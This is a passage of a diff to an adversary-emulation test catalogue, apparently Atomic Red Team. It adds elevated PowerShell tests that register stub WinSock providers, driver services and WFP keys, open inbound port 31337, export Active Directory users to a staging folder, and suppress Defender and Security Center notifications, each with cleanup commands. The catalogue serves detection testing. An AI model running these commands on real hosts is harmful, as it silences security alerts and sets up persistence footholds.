+      auto_generated_guid: 4ddd4d04-e0f9-4273-9d6f-59f18f0af5f6
+      description: 'Simulates an adversary adding a custom WinSock Name Space Provider
+        to intercept name resolution and socket binding requests.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog
+          Entries\000000000099" -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog
+          Entries\000000000099" -Name "DisplayName" -Value "Simulated NSP Filter"
+          -ErrorAction SilentlyContinue; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog
+          Entries\000000000099" -Name "LibraryPath" -Value "C:\Windows\System32\simulated_nsp.dll"
+          -ErrorAction SilentlyContinue; Write-Host "[+] Simulated WinSock NSP catalog
+          injection executed."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog
+          Entries\000000000099" -Recurse -Force -ErrorAction SilentlyContinue; Write-Host
+          "[+] Cleaned up simulated WinSock NSP entry."
+    - name: T1205.002 - Simulate Packet Capture Driver Service Registration
+      auto_generated_guid: '0284704c-59a0-44f2-b613-c10cc61b6b65'
+      description: 'Simulates an adversary registering a rogue kernel-level packet
+        capture driver service to intercept raw network traffic.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture"
+          -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture"
+          -Name "ImagePath" -Value "system32\drivers\simulated_capture.sys" -ErrorAction
+          SilentlyContinue; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture"
+          -Name "Type" -Value 1 -ErrorAction SilentlyContinue; Set-ItemProperty -Path
+          "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture" -Name "Start"
+          -Value 3 -ErrorAction SilentlyContinue; Write-Host "[+] Simulated packet
+          capture driver service registered."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture"
+          -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up
+          simulated driver service registration."
+    - name: T1205.002 - Register Custom WFP Callout Provider Registry Key
+      auto_generated_guid: e46b7c40-2b5b-493a-a7b3-63377ae21e6c
+      description: 'Simulates an adversary registering a Windows Filtering Platform
+        callout provider registry configuration to hook deep packet inspection points.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\Providers\{11111111-2222-3333-4444-555555555555}"
+          -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\Providers\{11111111-2222-3333-4444-555555555555}"
+          -Name "DisplayName" -Value "T1205_Simulated_Callout_Provider" -ErrorAction
+          SilentlyContinue; Write-Host "[+] Simulated WFP callout provider registry
+          key added."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\Providers\{11111111-2222-3333-4444-555555555555}"
+          -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up
+          simulated WFP callout provider."
+    - name: T1205.002 - Modify TCPIP Parameter Registry for Raw Socket Behavior
+      auto_generated_guid: 254ebca5-a2d5-4831-af33-67d669b8309a
+      description: 'Simulates adversary adjustment of network stack registry configurations
+        to alter raw socket handling and packet inspection thresholds.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
+          -Name "MaxRawSockets" -Value 500 -ErrorAction SilentlyContinue; Write-Host
+          "[+] Simulated TCPIP raw socket parameter modified."
+        cleanup_command: Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
+          -Name "MaxRawSockets" -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned
+          up TCPIP raw socket parameter."
+    - name: T1205.002 - Register Winsock Transport Filter Layer Provider
+      auto_generated_guid: 3bed0acb-e95a-492e-845d-adf05a0c4108
+      description: 'Simulates adversary registration of a Winsock Layered Service
+        Provider (LSP) or transport filter key in the networking stack.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: $val = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "ProviderOrder" -ErrorAction SilentlyContinue).ProviderOrder; Set-ItemProperty
+          -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "T1205_BackupOrder" -Value $val -ErrorAction SilentlyContinue; Set-ItemProperty
+          -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "ProviderOrder" -Value "$val,SimulatedProvider" -ErrorAction SilentlyContinue;
+          Write-Host "[+] Simulated Winsock provider order modification applied."
+        cleanup_command: $backup = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "T1205_BackupOrder" -ErrorAction SilentlyContinue).T1205_BackupOrder;
+          if ($null -ne $backup) { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "ProviderOrder" -Value $backup }; Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "T1205_BackupOrder" -ErrorAction SilentlyContinue; Write-Host "[+]
+          Cleaned up Winsock provider order."
+    - name: T1205.002 - Inject Simulated Socket Filter Helper Key in NetworkStack
+      auto_generated_guid: 58dbc799-5344-4fcd-819d-8c3713011c1f
+      description: 'Simulates an adversary injecting network stack helper configuration
+        keys to monitor raw socket states for trigger packets.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkInformation"
+          -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkInformation"
+          -Name "SimulatedFilterState" -Value 1 -ErrorAction SilentlyContinue; Write-Host
+          "[+] Simulated network stack helper key injected."
+        cleanup_command: Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkInformation"
+          -Name "SimulatedFilterState" -ErrorAction SilentlyContinue; Write-Host "[+]
+          Cleaned up simulated network stack helper key."
+    - name: T1205.002 - Register Custom WFP Sublayer Registry Key
+      auto_generated_guid: e631d66d-ed47-4b96-9ff9-ae7bc0d9efbf
+      description: 'Simulates an adversary creating a custom WFP sublayer registry
+        configuration to manage high-priority packet filtering rules.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\SubLayers\{99999999-8888-7777-6666-555555555555}"
+          -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\SubLayers\{99999999-8888-7777-6666-555555555555}"
+          -Name "DisplayName" -Value "T1205_Simulated_Sublayer" -ErrorAction SilentlyContinue;
+          Write-Host "[+] Simulated WFP sublayer registry key added."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\SubLayers\{99999999-8888-7777-6666-555555555555}"
+          -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up
+          simulated WFP sublayer."
+    - name: T1205.002 - Create Raw Socket Binding Persistence Hook Registry
+      auto_generated_guid: e69a8f7f-13d2-47fb-94cf-17471a5636a6
+      description: 'Simulates an adversary adding a networking hook parameter registry
+        entry to initialize custom socket filter hooks at system startup.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkCards"
+          -Name "T1205_HookState" -Value 1 -ErrorAction SilentlyContinue; Write-Host
+          "[+] Simulated network card hook key created."
+        cleanup_command: Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\NetworkCards" -Name "T1205_HookState" -ErrorAction SilentlyContinue;
+          Write-Host "[+] Cleaned up network card hook key."
   T1037:
     technique:
       type: attack-pattern
@@ -52606,7 +54066,7 @@ command-and-control:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.619Z'
-      name: Socket Filters
+      name: 'Traffic Signaling: Socket Filters'
       description: |-
         Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.
 
@@ -52634,7 +54094,203 @@ command-and-control:
       - macOS
       - Windows
       x_mitre_version: '2.0'
-    atomic_tests: []
+      identifier: T1205.002
+    atomic_tests:
+    - name: T1205.002 - Add Custom Firewall Rule for Traffic Signaling Simulation
+      auto_generated_guid: c33f6e7b-87f9-45be-be0e-8eaa0616034d
+      description: 'Simulates an adversary creating a custom inbound firewall rule
+        designed to act as a traffic signaling trigger for backdoor activation.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-NetFirewallRule -DisplayName "T1205_Signal_Knock_Rule" -Direction
+          Inbound -Protocol TCP -LocalPort 31337 -Action Allow -Description "Simulated
+          traffic signaling trigger rule"; Write-Host "[+] Simulated port knocking
+          signal rule created."
+        cleanup_command: Remove-NetFirewallRule -DisplayName "T1205_Signal_Knock_Rule"
+          -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up signal firewall
+          rule."
+    - name: T1205.002 - Register Custom WinSock Protocol Catalog Entry
+      auto_generated_guid: 90fd1078-149b-4da4-b0f7-1113030dd8ae
+      description: 'Simulates an adversary modifying WinSock protocol catalogs (`Protocol_Catalog9`)
+        to register a custom packet interception provider.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog
+          Entries\000000000099" -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog
+          Entries\000000000099" -Name "PackedCatalogItem" -Value ([byte[]](0..31))
+          -ErrorAction SilentlyContinue; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog
+          Entries\000000000099" -Name "DisplayName" -Value "Simulated Filter Provider"
+          -ErrorAction SilentlyContinue; Write-Host "[+] Simulated WinSock protocol
+          catalog modification executed."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog
+          Entries\000000000099" -Recurse -Force -ErrorAction SilentlyContinue; Write-Host
+          "[+] Cleaned up simulated WinSock catalog entry."
+    - name: T1205.002 - Register Custom WinSock Name Space Provider (NSP) Stub
+      auto_generated_guid: 4ddd4d04-e0f9-4273-9d6f-59f18f0af5f6
+      description: 'Simulates an adversary adding a custom WinSock Name Space Provider
+        to intercept name resolution and socket binding requests.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog
+          Entries\000000000099" -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog
+          Entries\000000000099" -Name "DisplayName" -Value "Simulated NSP Filter"
+          -ErrorAction SilentlyContinue; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog
+          Entries\000000000099" -Name "LibraryPath" -Value "C:\Windows\System32\simulated_nsp.dll"
+          -ErrorAction SilentlyContinue; Write-Host "[+] Simulated WinSock NSP catalog
+          injection executed."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog
+          Entries\000000000099" -Recurse -Force -ErrorAction SilentlyContinue; Write-Host
+          "[+] Cleaned up simulated WinSock NSP entry."
+    - name: T1205.002 - Simulate Packet Capture Driver Service Registration
+      auto_generated_guid: '0284704c-59a0-44f2-b613-c10cc61b6b65'
+      description: 'Simulates an adversary registering a rogue kernel-level packet
+        capture driver service to intercept raw network traffic.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture"
+          -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture"
+          -Name "ImagePath" -Value "system32\drivers\simulated_capture.sys" -ErrorAction
+          SilentlyContinue; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture"
+          -Name "Type" -Value 1 -ErrorAction SilentlyContinue; Set-ItemProperty -Path
+          "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture" -Name "Start"
+          -Value 3 -ErrorAction SilentlyContinue; Write-Host "[+] Simulated packet
+          capture driver service registered."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture"
+          -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up
+          simulated driver service registration."
+    - name: T1205.002 - Register Custom WFP Callout Provider Registry Key
+      auto_generated_guid: e46b7c40-2b5b-493a-a7b3-63377ae21e6c
+      description: 'Simulates an adversary registering a Windows Filtering Platform
+        callout provider registry configuration to hook deep packet inspection points.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\Providers\{11111111-2222-3333-4444-555555555555}"
+          -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\Providers\{11111111-2222-3333-4444-555555555555}"
+          -Name "DisplayName" -Value "T1205_Simulated_Callout_Provider" -ErrorAction
+          SilentlyContinue; Write-Host "[+] Simulated WFP callout provider registry
+          key added."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\Providers\{11111111-2222-3333-4444-555555555555}"
+          -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up
+          simulated WFP callout provider."
+    - name: T1205.002 - Modify TCPIP Parameter Registry for Raw Socket Behavior
+      auto_generated_guid: 254ebca5-a2d5-4831-af33-67d669b8309a
+      description: 'Simulates adversary adjustment of network stack registry configurations
+        to alter raw socket handling and packet inspection thresholds.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
+          -Name "MaxRawSockets" -Value 500 -ErrorAction SilentlyContinue; Write-Host
+          "[+] Simulated TCPIP raw socket parameter modified."
+        cleanup_command: Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
+          -Name "MaxRawSockets" -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned
+          up TCPIP raw socket parameter."
+    - name: T1205.002 - Register Winsock Transport Filter Layer Provider
+      auto_generated_guid: 3bed0acb-e95a-492e-845d-adf05a0c4108
+      description: 'Simulates adversary registration of a Winsock Layered Service
+        Provider (LSP) or transport filter key in the networking stack.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: $val = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "ProviderOrder" -ErrorAction SilentlyContinue).ProviderOrder; Set-ItemProperty
+          -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "T1205_BackupOrder" -Value $val -ErrorAction SilentlyContinue; Set-ItemProperty
+          -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "ProviderOrder" -Value "$val,SimulatedProvider" -ErrorAction SilentlyContinue;
+          Write-Host "[+] Simulated Winsock provider order modification applied."
+        cleanup_command: $backup = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "T1205_BackupOrder" -ErrorAction SilentlyContinue).T1205_BackupOrder;
+          if ($null -ne $backup) { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "ProviderOrder" -Value $backup }; Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "T1205_BackupOrder" -ErrorAction SilentlyContinue; Write-Host "[+]
+          Cleaned up Winsock provider order."
+    - name: T1205.002 - Inject Simulated Socket Filter Helper Key in NetworkStack
+      auto_generated_guid: 58dbc799-5344-4fcd-819d-8c3713011c1f
+      description: 'Simulates an adversary injecting network stack helper configuration
+        keys to monitor raw socket states for trigger packets.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkInformation"
+          -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkInformation"
+          -Name "SimulatedFilterState" -Value 1 -ErrorAction SilentlyContinue; Write-Host
+          "[+] Simulated network stack helper key injected."
+        cleanup_command: Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkInformation"
+          -Name "SimulatedFilterState" -ErrorAction SilentlyContinue; Write-Host "[+]
+          Cleaned up simulated network stack helper key."
+    - name: T1205.002 - Register Custom WFP Sublayer Registry Key
+      auto_generated_guid: e631d66d-ed47-4b96-9ff9-ae7bc0d9efbf
+      description: 'Simulates an adversary creating a custom WFP sublayer registry
+        configuration to manage high-priority packet filtering rules.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\SubLayers\{99999999-8888-7777-6666-555555555555}"
+          -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\SubLayers\{99999999-8888-7777-6666-555555555555}"
+          -Name "DisplayName" -Value "T1205_Simulated_Sublayer" -ErrorAction SilentlyContinue;
+          Write-Host "[+] Simulated WFP sublayer registry key added."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\SubLayers\{99999999-8888-7777-6666-555555555555}"
+          -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up
+          simulated WFP sublayer."
+    - name: T1205.002 - Create Raw Socket Binding Persistence Hook Registry
+      auto_generated_guid: e69a8f7f-13d2-47fb-94cf-17471a5636a6
+      description: 'Simulates an adversary adding a networking hook parameter registry
+        entry to initialize custom socket filter hooks at system startup.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkCards"
+          -Name "T1205_HookState" -Value 1 -ErrorAction SilentlyContinue; Write-Host
+          "[+] Simulated network card hook key created."
+        cleanup_command: Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\NetworkCards" -Name "T1205_HookState" -ErrorAction SilentlyContinue;
+          Write-Host "[+] Cleaned up network card hook key."
   T1132.001:
     technique:
       type: attack-pattern
@@ -58935,6 +60591,39 @@ collection:
           del %TEMP%\T1119_3.txt >nul 2>&1
           del %TEMP%\T1119_4.txt >nul 2>&1
         name: command_prompt
+    - name: Enumerate Active Directory Users via PowerShell with csvde
+      auto_generated_guid: 15e9da28-5d0f-4c57-9f73-7c1b961343e0
+      description: "Leverages the native Windows administration tool csvde.exe executed
+        via PowerShell to export Active Directory user objects and properties to a
+        custom staging directory with a timestamped filename. \nThis technique replicates
+        \"Living off the Land\" discovery, automated collection, and staging tactics
+        historically utilized by the menuPass threat group (G0045) to profile target
+        domains.\n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $StageDir = "C:\Users\Public\Libraries\staging"
+          if (-not (Test-Path -Path $StageDir)) {
+              New-Item -ItemType Directory -Path $StageDir | Out-Null
+          }
+          $TS = Get-Date -Format "yyyyMMdd_HHmmss"
+          $OutputFile = Join-Path $StageDir "ad_export_$TS.csv"
+          $CsvdeArgs = @(
+              "-f", $OutputFile,
+              "-r", "(&(objectClass=user)(objectCategory=person))",
+              "-l", "DN,sAMAccountName,userPrincipalName,mail,displayName,description,memberOf"
+          )
+          & csvde.exe @CsvdeArgs
+        cleanup_command: |
+          Remove-Item -Path "C:\Users\Public\Libraries\staging\ad_export_*.csv" -ErrorAction SilentlyContinue
+          if (Test-Path "C:\Users\Public\Libraries\staging") {
+              if ((Get-ChildItem "C:\Users\Public\Libraries\staging").Count -eq 0) {
+                  Remove-Item -Path "C:\Users\Public\Libraries\staging" -Force
+              }
+          }
   T1115:
     technique:
       type: attack-pattern
@@ -63484,7 +65173,7 @@ defense-impairment:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.620Z'
-      name: Modify or Spoof Tool UI
+      name: 'Disable or Modify Tools: Modify or Spoof Tool UI'
       description: "Adversaries may spoof or manipulate security tool user interfaces
         (UIs) to falsely indicate tools are functioning normally and delay detection
         and response. \n\nAdversaries may present misleading or falsified security
@@ -63518,7 +65207,216 @@ defense-impairment:
       - macOS
       - Windows
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1685.003
+    atomic_tests:
+    - name: T1685.003 - Suppress Action Center and Security Notifications via Registry
+        Modification
+      auto_generated_guid: 2d6fa33d-49ee-483c-9cb6-c579dc29cc47
+      description: 'Simulates an adversary modifying registry policies to suppress
+        security alerts and disable notifications within the Action Center UI.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings"
+          -Name "NOC_GLOBAL_SETTING_ALLOW_TOAST_WHILE_DND" -Value 0 -ErrorAction SilentlyContinue;
+          Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications"
+          -Name "NoToastApplicationNotification" -Value 1 -ErrorAction SilentlyContinue;
+          Write-Host "[+] Simulated UI notification suppression applied."
+        cleanup_command: Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings"
+          -Name "NOC_GLOBAL_SETTING_ALLOW_TOAST_WHILE_DND" -ErrorAction SilentlyContinue;
+          Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications"
+          -Name "NoToastApplicationNotification" -ErrorAction SilentlyContinue; Write-Host
+          "[+] Cleaned up notification suppression settings."
+    - name: T1685.003 - Modify TrayNotify Icon Streams to Simulate Taskbar Icon Spoofing
+      auto_generated_guid: 1d103cba-6f51-4246-b984-3e6c90ecef70
+      description: 'Simulates an adversary tampering with user tray icon stream registry
+        values to hide or manipulate security tool icons in the taskbar.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: $regPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify";
+          if (Test-Path -Path $regPath) { $backup = Get-ItemProperty -Path $regPath
+          -Name "IconStreams" -ErrorAction SilentlyContinue; if ($null -ne $backup)
+          { Set-ItemProperty -Path $regPath -Name "T1685_Backup" -Value $backup.IconStreams
+          }; Set-ItemProperty -Path $regPath -Name "IconStreams" -Value ([byte[]](0..15))
+          -ErrorAction SilentlyContinue; Write-Host "[+] Simulated tray icon stream
+          modification executed." }
+        cleanup_command: $regPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify";
+          if (Test-Path -Path $regPath) { $backup = Get-ItemProperty -Path $regPath
+          -Name "T1685_Backup" -ErrorAction SilentlyContinue; if ($null -ne $backup)
+          { Set-ItemProperty -Path $regPath -Name "IconStreams" -Value $backup.T1685_Backup;
+          Remove-ItemProperty -Path $regPath -Name "T1685_Backup" -ErrorAction SilentlyContinue
+          }; Write-Host "[+] Cleaned up tray icon stream simulation." }
+    - name: T1685.003 - Disable Security Center Notifications via WSC Registry Modification
+      auto_generated_guid: d659c40d-df83-4975-8dfc-5c7de06bd666
+      description: 'Simulates adversary tampering with Action Center settings to disable
+        security alerts and falsify operational status reporting.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: $path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WSC"; if
+          (-not (Test-Path -Path $path)) { New-Item -Path $path -Force | Out-Null
+          }; Set-ItemProperty -Path $path -Name "DisableNotifications" -Value 1 -ErrorAction
+          SilentlyContinue; Write-Host "[+] Simulated Security Center notification
+          disablement executed."
+        cleanup_command: Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WSC"
+          -Name "DisableNotifications" -ErrorAction SilentlyContinue; Write-Host "[+]
+          Cleaned up Security Center notification settings."
+    - name: T1685.003 - Modify Explorer Taskbar Tray Notification Policy Flags
+      auto_generated_guid: 6b21a71a-4153-4354-8876-4da24ce3d6f1
+      description: 'Simulates adversary modification of explorer taskbar settings
+        to alter icon visibility and override notification states.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer";
+          if (Test-Path -Path $path) { Set-ItemProperty -Path $path -Name "EnableAutoTray"
+          -Value 0 -ErrorAction SilentlyContinue; Write-Host "[+] Simulated Explorer
+          auto-tray modification applied." }
+        cleanup_command: $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer";
+          if (Test-Path -Path $path) { Remove-ItemProperty -Path $path -Name "EnableAutoTray"
+          -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up Explorer auto-tray
+          settings." }
+    - name: T1685.003 - Tamper with Security Center Client Notification Level Registry
+      auto_generated_guid: e42e28dc-394f-4afd-a9b1-8c5e2e9a595d
+      description: 'Simulates adversary configuration changes to Security Center alert
+        thresholds to suppress warning dialogs.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: $path = "HKLM:\SOFTWARE\Microsoft\Security Center"; if (Test-Path
+          -Path $path) { Set-ItemProperty -Path $path -Name "UINotification" -Value
+          0 -ErrorAction SilentlyContinue; Write-Host "[+] Simulated Security Center
+          UI notification level altered." }
+        cleanup_command: $path = "HKLM:\SOFTWARE\Microsoft\Security Center"; if (Test-Path
+          -Path $path) { Remove-ItemProperty -Path $path -Name "UINotification" -ErrorAction
+          SilentlyContinue; Write-Host "[+] Cleaned up Security Center UI notification
+          level." }
+    - name: T1685.003 - Modify Windows Defender Notification Settings via Registry
+      auto_generated_guid: ed14cb94-564c-4c5e-a0c2-b981bab5f53e
+      description: 'Simulates adversary modification of Windows Defender UI notification
+        behavior to suppress threat detection popups.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: $path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration";
+          if (-not (Test-Path -Path $path)) { New-Item -Path $path -Force | Out-Null
+          }; Set-ItemProperty -Path $path -Name "Notification_Level" -Value 2 -ErrorAction
+          SilentlyContinue; Write-Host "[+] Simulated Defender UX notification modification
+          applied."
+        cleanup_command: $path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX
+          Configuration"; if (Test-Path -Path $path) { Remove-ItemProperty -Path $path
+          -Name "Notification_Level" -ErrorAction SilentlyContinue; Write-Host "[+]
+          Cleaned up Defender UX notification settings." }
+    - name: T1685.003 - Clear PastIconsStream in TrayNotify to Simulate Tray Icon
+        Erasure
+      auto_generated_guid: c9c6f10e-fc1b-419d-83e1-311eea1540bd
+      description: 'Simulates an adversary clearing historical tray icon mapping data
+        to blind user visibility of security tool icons.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: $regPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify";
